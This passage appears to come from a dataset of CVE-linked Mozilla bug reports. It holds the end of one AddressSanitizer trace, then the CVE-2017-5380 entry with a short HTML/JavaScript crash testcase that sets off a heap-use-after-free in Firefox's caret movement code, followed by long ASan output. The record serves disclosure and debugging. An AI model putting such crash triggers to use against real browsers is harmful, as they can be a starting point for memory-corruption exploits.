/home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:259:37 #31 0x7f1699e4ec41 in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:361:12 #32 0x7f1699e4ec41 in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:214 #33 0x7f1699e1af44 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1133:16 #34 0x7f1699e1c50f in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1286:17 #35 0x7f1699e06806 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:380:5 #36 0x7f1699e0a86d in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:711:9 #37 0x7f169c080055 in nsDocumentViewer::LoadComplete(nsresult) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:998:7 #38 0x7f169cdfa1de in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7615:5 #39 0x7f169cdf5fb4 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7415:7 #40 0x7f169cdfd57f in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7312:13 #41 0x7f1696c786a0 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1255:3 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/dom/base/nsWrapperCache.h:210:15 in HasFlag Shadow bytes around the buggy address: 0x0c1e8000cc10: 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa 0x0c1e8000cc20: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 0x0c1e8000cc30: 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa 0x0c1e8000cc40: fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c1e8000cc50: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa =>0x0c1e8000cc60: fd fd fd[fd]fd fd fd fd fd fd fd fd fd fd fd fd 0x0c1e8000cc70: fd fd fd fd fd fd fa fa fa fa fa fa fa fa 00 00 0x0c1e8000cc80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c1e8000cc90: 00 00 00 fa fa fa fa fa fa fa fa fa 00 00 00 00 0x0c1e8000cca0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c1e8000ccb0: 00 fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==936==ABORTING"
      }
    ],
    "CVE-2017-5380": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1322107",
        "title": "heap-use-after-free in nsFrameSelection::MoveCaret",
        "description": "The latest ASAN build of Firefox (BuildID=20161204150411) crashes as follows when loading the testcase. crash.html: <script> function start() { o6=document.createElement('iframe'); o38=document.createElement('th'); o43=document.createElement('th'); o94=document.createRange(); try{while(document.removeChild(document.firstChild));}catch(e){} o105=document.implementation.createHTMLDocument(); o105.body.appendChild(o6); document.appendChild(o105.documentElement); o121=frames[0]; o122=o121.document; o122.documentElement.appendChild(o38); o171=o121.getSelection(); document.documentElement.appendChild(o43); o38.innerHTML=\"<svg id><animate attributeName='dominant-baseline'>\"; o171.addRange(o94); o171.modify('move', 'forward','lineboundary'); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==24239==ERROR: AddressSanitizer: heap-use-after-free on address 0x6170001a959b at pc 0x7fd6f8c533e2 bp 0x7ffcde0bc590 sp 0x7ffcde0bc588 READ of size 2 at 0x6170001a959b thread T0 (Web Content) #0 0x7fd6f8c533e1 in mozilla::PresShell::FlushPendingNotifications(mozilla::ChangesToFlush) /home/worker/workspace/build/src/layout/base/PresShell.cpp:4171:27 #1 0x7fd6f905bef5 in nsFrameSelection::MoveCaret(nsDirection, bool, nsSelectionAmount, nsFrameSelection::CaretMovementStyle) /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:970:3 #2 0x7fd6f908abbd in mozilla::dom::Selection::Modify(nsAString_internal const&, nsAString_internal const&, nsAString_internal const&, mozilla::ErrorResult&) /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:6420:8 #3 0x7fd6f5acc819 in mozilla::dom::SelectionBinding::modify(JSContext*, JS::Handle<JSObject*>, mozilla::dom::Selection*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/SelectionBinding.cpp:710:3 #4 0x7fd6f67e9f30 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2879:13 #5 0x7fd6fcbf885c in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #6 0x7fd6fcbf885c in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:457 #7 0x7fd6fcbf9192 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:521:10 #8 0x7fd6fc959eac in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #9 0x7fd6fc92941f in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:333:14 #10 0x7fd6fc936b9f in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:400:12 #11 0x7fd6fc93934e in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:689:12 #12 0x7fd6fcbf8913 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #13 0x7fd6fcbf8913 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:445 #14 0x7fd6fcbd8bf5 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:508:12 #15 0x7fd6fcbd8bf5 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2919 #16 0x7fd6fcbbd746 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:403:12 #17 0x7fd6fcbf8adc in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:475:15 #18 0x7fd6fcbf9192 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:521:10 #19 0x7fd6fc6ce06d in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2830:12 #20 0x7fd6f61fbf1f in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:259:37 #21 0x7fd6f6c4fa81 in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:361:12 #22 0x7fd6f6c4fa81 in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:214 #23 0x7fd6f6c1975d in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1133:16 #24 0x7fd6f6c1b1a9 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1286:17 #25 0x7fd6f6c057f3 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:463:5 #26 0x7fd6f6c09154 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:820:9 #27 0x7fd6f8d52939 in nsDocumentViewer::LoadComplete(nsresult) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1024:7 #28 0x7fd6f9bd218e in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7583:5 #29 0x7fd6f9bcdfd4 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7387:7 #30 0x7fd6f9bd564f in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7284:13 #31 0x7fd6f3e09500 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1255:3 #32 0x7fd6f3e08498 in nsDocLoader::doStopDocumentLoad(nsIRequest*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:840:5 #33 0x7fd6f3e051ff in nsDocLoader::DocLoaderIsEmpty(bool) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:730:9 #34 0x7fd6f3e072f4 in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:612:5 #35 0x7fd6f3e07eac in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:468:14 #36 0x7fd6f230c91b in mozilla::net::nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:633:18 #37 0x7fd6f4decf8b in nsDocument::DoUnblockOnload() /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8624:7 #38 0x7fd6f4e9a44f in nsUnblockOnloadEvent::Run() /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8577:5 #39 0x7fd6f212966b in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1213:7 #40 0x7fd6f21ad53c in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/glue/nsThreadUtils.cpp:381:10 #41 0x7fd6f2f5451f in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #42 0x7fd6f2ec27c8 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:232:3 #43 0x7fd6f2ec27c8 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:225 #44 0x7fd6f2ec27c8 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:205 #45 0x7fd6f8529bdf in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3 #46 0x7fd6fa712e57 in XRE_RunAppShell /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:924:12 #47 0x7fd6f2ec27c8 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:232:3 #48 0x7fd6f2ec27c8 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:225 #49 0x7fd6f2ec27c8 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:205 #50 0x7fd6fa7121a7 in XRE_InitChildProcess /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:756:7 #51 0x4dfb5b in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:115:19 #52 0x4dfb5b in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:438 #53 0x7fd70d23d82f in __libc_start_main /build/glibc-Qz8a69/glibc-2.23/csu/../csu/libc-start.c:291 #54 0x41ba38 in _start (/home/nils/MonkeyFarm/firefox/firefox+0x41ba38) 0x6170001a959b is located 283 bytes inside of 752-byte region [0x6170001a9480,0x6170001a9770) freed by thread T0 (Web Content) here: #0 0x4b218b in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:38:3 #1 0x7fd6f8c2fcd4 in mozilla::PresShell::Release() /home/worker/workspace/build/src/layout/base/PresShell.cpp:837:1 #2 0x7fd6f8c52f26 in ~nsCOMPtr_base /home/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:294:7 #3 0x7fd6f8c52f26 in mozilla::PresShell::FlushPendingNotifications(mozilla::ChangesToFlush) /home/worker/workspace/build/src/layout/base/PresShell.cpp:4165 #4 0x7fd6f905bef5 in nsFrameSelection::MoveCaret(nsDirection, bool, nsSelectionAmount, nsFrameSelection::CaretMovementStyle) /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:970:3 #5 0x7fd6f908abbd in mozilla::dom::Selection::Modify(nsAString_internal const&, nsAString_internal const&, nsAString_internal const&, mozilla::ErrorResult&) /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:6420:8 #6 0x7fd6f5acc819 in mozilla::dom::SelectionBinding::modify(JSContext*, JS::Handle<JSObject*>, mozilla::dom::Selection*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/SelectionBinding.cpp:710:3 #7 0x7fd6f67e9f30 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2879:13 #8 0x7fd6fcbf885c in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #9 0x7fd6fcbf885c in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:457 #10 0x7fd6fcbf9192 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:521:10 #11 0x7fd6fc959eac in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #12 0x7fd6fc92941f in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:333:14 #13 0x7fd6fc936b9f in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:400:12 #14 0x7fd6fc93934e in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:689:12 #15 0x7fd6fcbf8913 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #16 0x7fd6fcbf8913 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:445 #17 0x7fd6fcbd8bf5 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:508:12 #18 0x7fd6fcbd8bf5 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2919 #19 0x7fd6fcbbd746 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:403:12 #20 0x7fd6fcbf8adc in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:475:15 #21 0x7fd6fcbf9192 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:521:10 #22 0x7fd6fc6ce06d in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2830:12 #23 0x7fd6f61fbf1f in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:259:37 #24 0x7fd6f6c4fa81 in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:361:12 #25 0x7fd6f6c4fa81 in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:214 #26 0x7fd6f6c1975d in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1133:16 #27 0x7fd6f6c1b1a9 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1286:17 #28 0x7fd6f6c057f3 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:463:5 #29 0x7fd6f6c09154 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:820:9 #30 0x7fd6f8d52939 in nsDocumentViewer::LoadComplete(nsresult) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1024:7 #31 0x7fd6f9bd218e in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7583:5 #32 0x7fd6f9bcdfd4 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7387:7 #33 0x7fd6f9bd564f in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7284:13 #34 0x7fd6f3e09500 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1255:3 previously allocated by thread T0 (Web Content) here: #0 0x4b24ab in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3 #1 0x4e0d9d in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7fd6f4db0358 in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7fd6f4db0358 in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/PresShell.h:87 #4 0x7fd6f4db0358 in nsDocument::doCreateShell(nsPresContext*, nsViewManager*, mozilla::StyleSetHandle) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:3605 #5 0x7fd6f70611a7 in nsHTMLDocument::CreateShell(nsPresContext*, nsViewManager*, mozilla::StyleSetHandle) /home/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:275:10 #6 0x7fd6f8d4b8d1 in nsDocumentViewer::InitPresentationStuff(bool) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:660:16 #7 0x7fd6f8d4b1b8 in nsDocumentViewer::InitInternal(nsIWidget*, nsISupports*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, bool, bool, bool) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:915:10 #8 0x7fd6f8d4a317 in nsDocumentViewer::Init(nsIWidget*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:644:10 #9 0x7fd6f9bcb732 in nsDocShell::SetupNewViewer(nsIContentViewer*) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:9351:7 #10 0x7fd6f9bc9e39 in nsDocShell::Embed(nsIContentViewer*, char const*, nsISupports*) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7208:17 #11 0x7fd6f9bd862a in nsDocShell::CreateAboutBlankContentViewer(nsIPrincipal*, nsIURI*, bool) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:8064:14 #12 0x7fd6f9b77003 in nsDocShell::EnsureContentViewer() /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7933:17 #13 0x7fd6f9babb77 in GetDocument /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:4523:3 #14 0x7fd6f9babb77 in non-virtual thunk to nsDocShell::GetDocument() /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:4521 #15 0x7fd6f4b1d983 in MaybeCreateDoc /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:3821:38 #16 0x7fd6f4b1d983 in GetDoc /home/worker/workspace/build/src/obj-firefox/dist/include/nsPIDOMWindow.h:185 #17 0x7fd6f4b1d983 in EnsureInnerWindow /home/worker/workspace/build/src/obj-firefox/dist/include/nsPIDOMWindow.h:888 #18 0x7fd6f4b1d983 in WrapObject /home/worker/workspace/build/src/dom/base/nsGlobalWindow.h:305 #19 0x7fd6f4b1d983 in non-virtual thunk to nsGlobalWindow::WrapObject(JSContext*, JS::Handle<JSObject*>) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.h:303 #20 0x7fd6f391c69c in XPCConvert::NativeInterface2JSObject(JS::MutableHandle<JS::Value>, nsIXPConnectJSObjectHolder**, xpcObjectHelper&, nsID const*, bool, nsresult*) /home/worker/workspace/build/src/js/xpconnect/src/XPCConvert.cpp:784:16 #21 0x7fd6f391a5b3 in XPCConvert::NativeData2JS(JS::MutableHandle<JS::Value>, void const*, nsXPTType const&, nsID const*, nsresult*) /home/worker/workspace/build/src/js/xpconnect/src/XPCConvert.cpp:344:16 #22 0x7fd6f39c6332 in GatherAndConvertResults /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1600:18 #23 0x7fd6f39c6332 in Call /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1394 #24 0x7fd6f39c6332 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1350 #25 0x7fd6f39cd7af in GetAttribute /home/worker/workspace/build/src/js/xpconnect/src/xpcprivate.h:1877:17 #26 0x7fd6f39cd7af in XPC_WN_GetterSetter(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1179 #27 0x7fd6fcbf885c in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #28 0x7fd6fcbf885c in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:457 #29 0x7fd6fcc7c071 in Call /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:521:10 #30 0x7fd6fcc7c071 in CallGetter /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:635 #31 0x7fd6fcc7c071 in CallGetter(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<js::Shape*>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/NativeObject.cpp:1809 #32 0x7fd6fcc06b3f in GetExistingProperty<js::AllowGC::CanGC> /home/worker/workspace/build/src/js/src/vm/NativeObject.cpp:1857:10 #33 0x7fd6fcc06b3f in NativeGetPropertyInline<js::AllowGC::CanGC> /home/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2084 #34 0x7fd6fcc06b3f in NativeGetProperty /home/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2118 #35 0x7fd6fcc06b3f in GetProperty /home/worker/workspace/build/src/js/src/vm/NativeObject.h:1523 #36 0x7fd6fcc06b3f in GetProperty /home/worker/workspace/build/src/js/src/jsobj.h:844 #37 0x7fd6fcc06b3f in js::GetProperty(JSContext*, JS::Handle<JS::Value>, JS::Handle<js::PropertyName*>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:4273 #38 0x7fd6fcbdcbbc in GetPropertyOperation /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:192:12 #39 0x7fd6fcbdcbbc in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2636 #40 0x7fd6fcbbd746 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:403:12 #41 0x7fd6fcbf8adc in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:475:15 #42 0x7fd6fcbf9192 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:521:10 #43 0x7fd6fc6cbe02 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2771:12 #44 0x7fd6f39a95b7 in nsXPCWrappedJSClass::CallMethod(nsXPCWrappedJS*, unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedJSClass.cpp:1211:23 #45 0x7fd6f2154326 in PrepareAndDispatch /home/worker/workspace/build/src/xpcom/reflect/xptcall/md/unix/xptcstubs_x86_64_linux.cpp:122:14 #46 0x7fd6f21532f6 in SharedStub (/home/nils/MonkeyFarm/firefox/libxul.so+0x1f872f6) #47 0x7fd6fa581ef8 in nsBrowserStatusFilter::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/toolkit/components/statusfilter/nsBrowserStatusFilter.cpp:172:16 #48 0x7fd6f3e09500 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1255:3 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/layout/base/PresShell.cpp:4171:27 in mozilla::PresShell::FlushPendingNotifications(mozilla::ChangesToFlush) Shadow bytes around the buggy address: 0x0c2e8002d260: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2e8002d270: fd fd fd fd fd 